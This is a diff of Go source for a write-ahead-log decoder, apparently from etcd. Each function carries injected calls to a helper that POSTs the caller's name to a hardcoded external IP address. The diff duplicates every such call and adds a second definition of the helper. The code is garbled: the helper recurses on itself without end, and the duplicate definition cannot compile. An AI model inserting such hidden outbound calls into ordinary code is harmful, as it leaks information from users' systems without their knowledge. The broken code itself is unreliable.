@@ -29,6 +29,8 @@ type decoder struct {
 func newDecoder(r ...io.Reader) *decoder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	readers := make([]*bufio.Reader, len(r))
 	for i := range r {
 		readers[i] = bufio.NewReader(r[i])
@@ -38,12 +40,16 @@ func newDecoder(r ...io.Reader) *decoder {
 func (d *decoder) decode(rec *walpb.Record) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	rec.Reset()
 	d.mu.Lock()
 	defer d.mu.Unlock()
 	return d.decodeRecord(rec)
 }
 func (d *decoder) decodeRecord(rec *walpb.Record) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(d.brs) == 0 {
@@ -90,6 +96,8 @@ func (d *decoder) decodeRecord(rec *walpb.Record) error {
 func decodeFrameSize(lenField int64) (recBytes int64, padBytes int64) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	recBytes = int64(uint64(lenField) & ^(uint64(0xff) << 56))
 	if lenField < 0 {
 		padBytes = int64((uint64(lenField) >> 56) & 0x7)
@@ -97,6 +105,8 @@ func decodeFrameSize(lenField int64) (recBytes int64, padBytes int64) {
 	return recBytes, padBytes
 }
 func (d *decoder) isTornEntry(data []byte) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(d.brs) != 1 {
@@ -131,9 +141,13 @@ func (d *decoder) isTornEntry(data []byte) bool {
 func (d *decoder) updateCRC(prevCrc uint32) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	d.crc = crc.New(prevCrc, crcTable)
 }
 func (d *decoder) lastCRC() uint32 {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return d.crc.Sum32()
@@ -141,9 +155,13 @@ func (d *decoder) lastCRC() uint32 {
 func (d *decoder) lastOffset() int64 {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return d.lastValidOff
 }
 func mustUnmarshalEntry(d []byte) raftpb.Entry {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var e raftpb.Entry
@@ -153,11 +171,15 @@ func mustUnmarshalEntry(d []byte) raftpb.Entry {
 func mustUnmarshalState(d []byte) raftpb.HardState {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var s raftpb.HardState
 	pbutil.MustUnmarshal(&s, d)
 	return s
 }
 func readInt64(r io.Reader) (int64, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var n int64
@@ -167,7 +189,16 @@ func readInt64(r io.Reader) (int64, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
